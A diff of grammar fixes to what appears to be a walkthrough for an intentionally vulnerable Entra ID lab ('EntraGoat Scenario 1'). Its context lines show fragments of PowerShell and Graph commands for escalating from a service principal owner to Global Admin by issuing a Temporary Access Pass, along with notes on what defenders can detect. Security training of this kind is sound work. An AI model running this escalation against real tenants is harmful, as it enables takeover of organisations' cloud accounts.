@@ -30,13 +30,13 @@ No phishing, no persistence tricks - just raw role power obtained through a misc
 The attacker logs in with the freshly reset GA password or TAP and assumes full control of the tenant.
 While the access is technically legitimate, it's far from invisible - logs will show the password reset event, the sign-in IP, device fingerprint, and more.
 
-From a defender's perspective, these are plenty breadcrumbs to follow:
+From a defender's perspective, there are plenty of breadcrumbs to follow:
 Who reset the password? From where? What followed?
 Even if it looks like routine admin behavior, it's a classic case of "legit credentials, malicious intent."
 
 - - - 
 
---> So... why this works?
+--> So... why does this work?
 Microsoft allows SP owners to manage credentials without additional approval.
 When those SPs are assigned sensitive roles, ownership becomes a critical path for privilege escalation.
 Low-priv users might own SPs if:
@@ -58,7 +58,7 @@ you must have the function/BARK toolkit loaded in PS memory to use this function
 function Find-OwnedServicePrincipals {
     param([string]$UserId)
     
-    # Get all service principals in tenant
+    # Get all service principals in the tenant
     $allSPs = Get-MgServicePrincipal -All
     Write-Host "Found $($allSPs.Count) service principals in tenant"
     
@@ -135,7 +135,7 @@ Connect-MgGraph
 # Verify authentication and context
 Get-MgContext
 
-# For a more detailed security context we can decode the JWT token issued to us with Parse-JWTToken function from BARK
+# For a more detailed security context we can decode the JWT token issued to us with the Parse-JWTToken function from BARK
 # This shows delegated permissions (scp), directory roles (wids), authentication method (amr), etc.
 # Parse-JWTToken -Token $userAccessToken
 
@@ -230,7 +230,7 @@ $tempAccessPass = @{
  }
 $TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
 $TAP.TemporaryAccessPass
-# log in as the admin user with the TAP to Azure Portal 
+# log in as the admin user with the TAP to the Azure Portal 
 
 # Disconnect SP session
 Disconnect-MgGraph
@@ -244,7 +244,7 @@ Connect-MgGraph -AccessToken $SecureAdminToken
 # Verify admin authentication
 Get-MgContext
 
-# You can decode the JWT token issued to the admin user for it's security context, do you see the differences?
+# You can decode the JWT token issued to the admin user for its security context, do you see the differences?
 # Parse-JWTToken -Token $userAccessToken
 #                VS
 # Parse-JWTToken -Token $adminAccessToken
@@ -259,7 +259,7 @@ Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userP
 Disconnect-MgGraph
 
 # Congratulations! You have successfully completed the EntraGoat Scenario 1.
-# Don't forget to run the cleanup script to restore the tenant to it's original state!
+# Don't forget to run the cleanup script to restore the tenant to its original state!
 
 # To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the source code for EntraGoat Scenario 1.
 
